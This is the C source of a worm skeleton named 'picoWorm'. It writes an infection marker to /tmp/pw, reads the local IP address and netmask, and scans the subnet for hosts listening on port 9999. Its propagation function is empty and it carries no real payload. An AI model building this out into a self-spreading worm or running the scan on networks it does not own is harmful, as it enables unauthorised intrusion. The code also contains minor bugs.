/* picoWorm
 by pico
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <errno.h>


#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>


/* Let's assume network will be type B or C */
#define MAX_TARGETS 255*255

static uint32_t ip[MAX_TARGETS];


int payload () {
  int fd;
  if ((fd = open ("/tmp/pw", O_CREAT | O_EXCL, S_IRWXU)) < 0) {
    if (errno == EEXIST) {
      printf ("+ Already infected node... We are done here!\n");
      close (fd);
      exit (EXIT_SUCCESS);
    } else {
      printf ("- ERROR: Cannot create tmp file...\n");
      exit (EXIT_FAILURE);
    }
  }
  printf ("+ Infecting node...\n");
  return 0;
}

int move () {
  
}


int scan () {
  int                fd, s;
  struct ifreq       ifr;
  unsigned long      ip;
  unsigned long      netmask, network;
  char               ips[17];
  int                n = 4;
  unsigned long      i;
  unsigned long      t;
  struct sockaddr_in ip1;
  int                top;
  unsigned char      *ptr;

  /* We need a socket to query IP Address and mask */
  fd = socket(AF_INET, SOCK_STREAM, 0);
  
  /* Get IP and Netmask */
  ifr.ifr_addr.sa_family = AF_INET; 
  strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);
  
  ioctl(fd, SIOCGIFADDR, &ifr);
  ip = (unsigned long)
    (((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr);

  ioctl(fd, SIOCGIFNETMASK, &ifr);
  netmask = (unsigned long)
    (((struct sockaddr_in *)&ifr.ifr_netmask)->sin_addr.s_addr);

  network = ntohl(ip & netmask);
  printf ("+ IP: %08lx  Netmask : %08lx  Network: %08lx\n",
	  ip, netmask, network);

  top = ~ntohl(netmask);
  
  /* Do Scan */
  ip1.sin_family = AF_INET;
  ip1.sin_port = htons(9999);

  for (i = 1; i < top; i++) {
    if ((i & 0xff) == 0xff) continue; // skip broadcast addresses
    if ((i & 0xff) == 0x00) continue; // skip network addresses
    
    // Print IP in human readable format
    ip1.sin_addr.s_addr = htonl(network | i);
    printf ("Scanning : %s (%08lx)...\n",
	    inet_ntoa(ip1.sin_addr), *((unsigned long *)&ip1));

    // Try to connect
    s = socket(AF_INET, SOCK_STREAM, 0);    
    if (connect (s, (struct sockaddr*)&ip1, 16) < 0) goto next_round;
    printf ("** Service found at : %s\n", inet_ntoa(ip1.sin_addr));
    move ();

  next_round:
    // perror ("ERROR:");
    close (s);
    
  }
  close(fd);  
}




int main () {
  payload ();
  scan ();
  move ();
  
}
